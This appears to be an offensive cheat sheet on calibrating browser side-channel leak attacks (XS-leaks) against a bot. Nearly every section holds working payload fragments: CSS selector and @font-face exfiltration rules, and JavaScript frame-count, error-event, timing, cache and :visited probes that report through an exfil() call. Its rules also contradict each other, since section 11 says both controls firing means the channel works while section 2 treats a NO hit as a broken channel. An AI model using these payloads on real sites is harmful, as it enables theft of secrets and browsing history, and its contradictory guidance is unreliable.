# Oracle calibration — the control pair, exhaustively

Every control-pair pattern — proving the channel works before trusting it.

---

## 1. Why the control pair is mandatory — the noise problem

```text
a side-channel is NOISY — a failed run and a negative answer look
identical:
- the selector doesn't match (a broken channel)
- the secret doesn't match (a true negative)
- the font doesn't load (a CSP block)
- the counter doesn't increment (a missing surface)

the always-true control proves the channel WORKS; the never-true
control proves 'no leak' isn't a broken channel. without both, a
'no signal' is uninterpretable — 'no leak' vs 'broken channel' is
undecidable.
```

## 2. The CSS-oracle control pair — the selector-proof

```css
/* always-true — a condition that always matches */
body[secret]{--yes:url('/leak/YES')}
/* never-true — a condition that never matches */
body[nosuchattr]{--no:url('/leak/NO')}
#trig-ctl{background-image:var(--yes,none),var(--no,none)}
```

```text
a YES hit + a NO miss → the channel works.
a NO hit → 'no leak' is a broken channel, not a negative answer.
```

## 3. The @font-face control pair — the char-proof

```css
/* always-true — a char that's definitely in the secret */
@font-face{font-family:x;src:url('/leak/known');unicode-range:U+0061}
/* never-true — a char that's definitely NOT in the secret */
@font-face{font-family:y;src:url('/leak/no');unicode-range:U+0000}
#secret{font-family:x;display:block !important}
```

```text
a 'known' font request + no 'no' request → the channel works.
```

## 4. The frames.length control pair — the count-proof

```js
// always-true — a URL that always renders a frame
var f=document.createElement('iframe');
f.src='https://t/known-frame';
f.onload=()=>exfil('YES='+f.contentWindow.frames.length);
// never-true — a URL that never renders a frame
var g=document.createElement('iframe');
g.src='https://t/never-frame';
g.onload=()=>exfil('NO='+g.contentWindow.frames.length);
```

## 5. The onload/onerror control pair — the status-proof

```js
// always-true — a URL that always 200s
var i=new Image(); i.onload=()=>exfil('YES'); i.src='https://t/hit';
// never-true — a URL that always 404s
var i2=new Image(); i2.onerror=()=>exfil('NO'); i2.src='https://t/miss';
```

## 6. The timing control pair — the threshold-proof

```js
// slow control — a URL that always hits (a slow path)
var t0=performance.now();
fetch('https://t/known-hit',{mode:'no-cors'})
 .finally(()=>exfil('slow='+Math.round(performance.now()-t0)));
// fast control — a URL that always misses (a fast rejection)
var t0=performance.now();
fetch('https://t/known-miss',{mode:'no-cors'})
 .finally(()=>exfil('fast='+Math.round(performance.now()-t0)));
```

```text
a slow-vs-fast threshold — the two means separate the states.
```

## 7. The cache-probe control pair — the cached-proof

```js
// cached control — a URL the bot definitely cached
var i=new Image(); i.src='https://t/known-cached';
// uncached control — a URL the bot definitely didn't cache
var i2=new Image(); i2.src='https://t/never-cached-'+Math.random();
```

## 8. The :visited control pair — the history-proof

```js
// visited control — a URL the bot definitely visited
var a=document.createElement('a');
a.href='https://t/known-visited'; document.body.appendChild(a);
// unvisited control — a URL the bot definitely didn't visit
var b=document.createElement('a');
b.href='https://t/never-visited-'+Math.random(); document.body.appendChild(b);
```

## 9. The server-state control pair — the mutation-proof

```text
an always-incremented counter — a GET that always increments.
a never-incremented counter — a GET that never runs.
'a counter is N+1' proves the channel works; 'a counter is N' proves
'no leak' isn't a broken channel.
```

## 10. The per-channel control-pair — the complete set

```text
channel              always-true              never-true
CSS-selector         body[secret]{--yes}      body[nosuchattr]{--no}
@font-face           a known char's face      a no-range face
frames.length        a known-frame URL        a never-frame URL
onload/onerror       a known-200 URL          a known-404 URL
timing               a known-slow URL         a known-fast URL
cache-probe          a known-cached URL       a never-cached URL
:visited             a known-visited URL      a never-visited URL
server-state         an always-mutated key    a never-mutated key
```

## 11. The control-pair failure modes — what each means

```text
a YES that doesn't fire → the channel is broken (the selector
  doesn't match, the font doesn't load, the surface is missing).
a NO that fires → the channel is noisy (a false-positive match, an
  ambient state).
a YES + a NO both fire → the channel works.
a YES + a NO both miss → the channel is broken.
```

## 12. The control-pair's role — the discrimination-proof

```text
the control pair isn't optional — it's the channel's discrimination
proof. a leak without a control pair is uninterpretable — 'the
secret didn't match' is indistinguishable from 'the channel is
broken' without a YES/NO pair.
```
